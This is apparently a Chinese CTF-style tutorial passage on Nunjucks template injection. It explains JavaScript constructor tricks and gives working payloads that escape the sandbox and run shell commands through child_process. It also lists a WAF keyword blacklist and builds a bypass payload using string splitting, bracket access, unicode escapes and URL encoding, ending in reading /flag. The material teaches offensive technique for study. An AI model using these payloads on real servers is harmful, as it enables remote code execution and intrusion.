    range (start step stop)
    {% for i in range(0, 5) -%}
      {{ i }},
    {%- endfor %}
以上输出 :`0,1,2,3,4`
### cycler(item1, item2, ...itemN):
轮换多个值的一种简单方法是使用`cycler`，它接受任意数量的参数并循环遍历它们。
    {% set cls = cycler("odd", "even") %}
    {% for row in rows %}
      {{ row.name }}
    {% endfor %}
在上面的示例中，奇数行的类别为“奇数”，偶数行的类别为“偶数”。您可以访问属性上的当前项`current`（在上例中为`cls.current`）。
### joiner([separator]):
组合多个项目时，通常希望用逗号等分隔它们，但您不想输出第一个项目的分隔符。除非第一次被调用，否则该类将`joiner`输出（默认为“，”）。`separator`
    {% set comma = joiner() %}
    {% for tag in tags -%}
      {{ comma() }} {{ tag }}
    {% endfor %}
如果`tags`是`["food", "beer", "dessert"]`，上面的例子将输出`food, beer, dessert`。
## 创建函数：
这三个全局函数是Nunjucks模板中唯一的可调用函数。这里我们需要运用一下Javascript中的语法。下面的内容在我学习的时候感觉有点难理解，很容易绕进去，所以我们分开来看每句话是什么意思。
  * 每一个 **对象** 里的 _constructor属性_ 指向这个 **对象** 的==构造函数==本身
  * 我们可以用这个==构造函数==创建一个新的 **对象**
  * 比如字符串 **对象** ， _constructor属性_ 指向`[Function：String]`（字符串对象的构造函数本身）。
    > 'string'.constructor
    [Function: String]
    >
所以我们就可以用这个构造函数`[Function：String]`来创建一个新的字符串。
  * 同理，如果我们获取到了 **一个函数或者方法（统称为对象）** 的==构造函数==
  * 那我们就可以用这个==构造函数==创建 **一个新的函数或者方法（统称为对象）**
  * 甚至可以创建一个新的匿名函数来执行任意代码。
## 构造函数：
所以我们可以自己构造一个函数：
    > function say(word) {
    ...     console.log(word);
    ... }
    undefined
    > say.constructor
    [Function: Function]
    >
  * 在代码中say就是我们自己构造的函数`say(word)`，他就是我们上面所说的对象。
  * 而`say.constructor`返回的结果`[Function: Function]`其实就是我们所说的： _constructor属性_ 指向这个 **对象** 的==构造函数==本身。
  * 然后我们利用这个构造函数 `[Function: Function]` 来创建一个匿名函数实现代码执行：
    > say.constructor("return console.log('success')")()
    success
    undefined
    >
  * 利用这个原理，我们通过 Nunjucks 提供的那几个全局函数便可以突破 Nunjucks 的沙箱限制并成实现任意代码执行。
  * 所以我们就用仅有的几个函数来构造一下自己的函数，然后来实现命令执行。
## 沙箱逃逸：
在逃逸之前我们先学习几个JavaScript中对应的几个基础知识，因为whoami师傅构造的payload中有这些知识，不知道的话，根本不知道怎么构造出来的……
### global预定义全局对象：
  * 在 JavaScript 中，`global` 是一个预定义的全局对象。
  * 它表示全局作用域，也就是说，在任何地方都可以访问它的属性和方法。
  * 在 Node.js 中，`global` 对象的属性和方法可以在任何模块中使用，而不需要使用 `require()` 来导入它们。
例如，在 Node.js 中，您可以使用 `global.process` 来访问 `process` 对象，而不需要使用
`require('process')`
### process：
在Node.js中，`process`是一个全局变量，它提供了许多与当前Node.js进程相关的信息和控制方法。它是Node.js的一个内置模块，用于访问当前Node.js进程的信息和配置。
### MainModule：
  * 在Node.js中，每个模块都有一个MainModule。MainModule是Node.js应用程序的入口模块，是Node.js应用程序启动时第一个被执行的模块。
  * MainModule通常是我们从命令行启动Node.js应用程序时传递给Node.js的JavaScript文件。 
  * 在MainModule中，我们可以使用Node.js的全局变量和模块系统来加载其他的模块，从而构建出完整的应用程序。MainModule也可以通过`require.main`属性来获取到，该属性指向当前Node.js应用程序执行的JavaScript文件所对应的模块对象。
  * 在MainModule中，我们可以通过`require.main === module`来判断当前模块是否为MainModule。
  * 除了MainModule外，每个模块都有自己的模块作用域和模块对象。
  * 模块作用域是指模块内部的变量和函数只能在该模块内部使用，而不能被其他模块访问。
  * 模块对象是指每个模块都有一个Module对象，该对象包含了当前模块的一些元数据信息，例如模块的ID、文件名、父模块、子模块等信息。
### `child_process`：
  * `child_process`是Node.js的一个模块，用于创建新的子进程并与其进行通信。在Node.js中，由于其单线程的特性，无法真正利用多核CPU的优势，因此`child_process`模块提供了一种方式来创建新的进程以充分利用系统资源。 `child_process`模块提供了四种创建子进程的方法：
    exec()： 执行一个shell命令，并将结果返回给Node.js。
    spawn()：启动一个新的进程，并能够与其进行标准的输入输出通信。
    fork()： 启动一个新的Node.js进程，并能够通过IPC通信与其进行交互。
    execFile()：类似于exec()，但是可以直接执行一个可执行文件而不需要通过shell解释器
  * 通过使用`child_process`模块，我们可以在Node.js中执行外部命令、启动其他的Node.js进程、执行可执行文件等操作，从而实现更加复杂的任务。
  * 同时，由于每个子进程都是独立的，因此可以更好地控制进程的资源使用和错误处理，提高应用程序的可靠性和稳定性。
### payload结构：
  * {{range.constructor("return global.process.mainModule.require('child_process').exec('calc')")()}}
  * {{range.constructor("return global.process.mainModule.require('child_process').execSync('ls /').toString()")()}}
我们来分析一下这一行代码的结构。
    range.constructor：是range全局函数里的constructor属性指向函数本身，其返回的结果是对应的构造函数，所以我们才能在参数里面进行命令执行，从而实现沙箱逃逸。
    global定义全局对象，然后调用process全局变量，然后MainModule来开启模块，来调用其他模块，所以下面就通过require调用了child_process模块，同时使用模块下面的exec函数来执行calc的shell命令，所以打开了计算器。
也可以通过字符串获取到 `[Function: Function]`：
  * {{'string'.toString.constructor("return global.process.mainModule.require('child_process').exec('calc')")()}}
  * {{'string'.constructor.constructor("return global.process.mainModule.require('child_process').exec('calc')")()}}
## Bypass：
我们看一下waf：
    |joiner|\'|range|root|cycler|constructor|toString|mainModule|main|require|\.|process|exec|object|file|spawn|eval|concat|base|buffer|from|空格
三个函数都被过滤了，我们可以用字符串拼接进行绕过，然后用[]来绕过点的过滤，然后用unicode编码绕过后面的操作。
    {{"string"["toSt"+"ring"]["const"+"ructor"]("return(global[\"\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\"][\"\\u006d\\u0061\\u0069\\u006e\\u004d\\u006f\\u0064\\u0075\\u006c\\u0065\"][\"\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\"](\"\\u0063\\u0068\\u0069\\u006c\\u0064\\u005f\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\")[\"\\u0065\\u0078\\u0065\\u0063\\u0053\\u0079\\u006e\\u0063\"](\"id\")[\"\\u0074\\u006f\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\"]())")()}}
    // {{'string'.constructor.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}
然后命令可以进行执行了以后，我们来读取flag
    {{"string"["toSt"+"ring"]["const"+"ructor"]("return(global[\"\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\"][\"\\u006d\\u0061\\u0069\\u006e\\u004d\\u006f\\u0064\\u0075\\u006c\\u0065\"][\"\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\"](\"\\u0063\\u0068\\u0069\\u006c\\u0064\\u005f\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\")[\"\\u0065\\u0078\\u0065\\u0063\\u0053\\u0079\\u006e\\u0063\"](\"\\u0063\\u0061\\u0074\\u0020\\u002f\\u0066\\u006c\\u0061\\u0067\")[\"\\u0074\\u006f\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\"]())")()}}
    // UrlEncode
    %7B%7B%22string%22%5B%22toSt%22%2B%22ring%22%5D%5B%22const%22%2B%22ructor%22%5D(%22return(global%5B%5C%22%5C%5Cu0070%5C%5Cu0072%5C%5Cu006f%5C%5Cu0063%5C%5Cu0065%5C%5Cu0073%5C%5Cu0073%5C%22%5D%5B%5C%22%5C%5Cu006d%5C%5Cu0061%5C%5Cu0069%5C%5Cu006e%5C%5Cu004d%5C%5Cu006f%5C%5Cu0064%5C%5Cu0075%5C%5Cu006c%5C%5Cu0065%5C%22%5D%5B%5C%22%5C%5Cu0072%5C%5Cu0065%5C%5Cu0071%5C%5Cu0075%5C%5Cu0069%5C%5Cu0072%5C%5Cu0065%5C%22%5D(%5C%22%5C%5Cu0063%5C%5Cu0068%5C%5Cu0069%5C%5Cu006c%5C%5Cu0064%5C%5Cu005f%5C%5Cu0070%5C%5Cu0072%5C%5Cu006f%5C%5Cu0063%5C%5Cu0065%5C%5Cu0073%5C%5Cu0073%5C%22)%5B%5C%22%5C%5Cu0065%5C%5Cu0078%5C%5Cu0065%5C%5Cu0063%5C%5Cu0053%5C%5Cu0079%5C%5Cu006e%5C%5Cu0063%5C%22%5D(%5C%22%5C%5Cu0063%5C%5Cu0061%5C%5Cu0074%5C%5Cu0020%5C%5Cu002f%5C%5Cu0066%5C%5Cu006c%5C%5Cu0061%5C%5Cu0067%5C%22)%5B%5C%22%5C%5Cu0074%5C%5Cu006f%5C%5Cu0053%5C%5Cu0074%5C%5Cu0072%5C%5Cu0069%5C%5Cu006e%5C%5Cu0067%5C%22%5D())%22)()%7D%7D
    // {{'string'.constructor.constructor("return global.process.mainModule.require('child_process').execSync('cat /flag').toString()")()}}